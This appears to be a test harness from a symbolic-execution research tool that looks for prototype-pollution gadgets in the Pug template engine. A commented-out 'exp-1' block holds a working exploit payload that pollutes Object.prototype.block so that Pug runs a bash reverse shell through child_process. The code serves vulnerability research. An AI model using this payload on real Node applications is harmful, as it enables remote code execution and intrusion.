pug = require("pug")
S$ = require("../../../lib/S$")

// ./expoSE+ --undefined-file /home/ubuntu/PPAEG/output/undefined-props-node/pug-undefined-props.json tests/template_engines/pug/app.js

// exp-1
// Object.prototype.block = {
//     type: "Text",
//     line: "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)"
// }
Object.prototype.block = {
    type: "Text",
    line: S$.pureSymbol('line_undef')
}


const template = pug.compile(`h1= msg`);
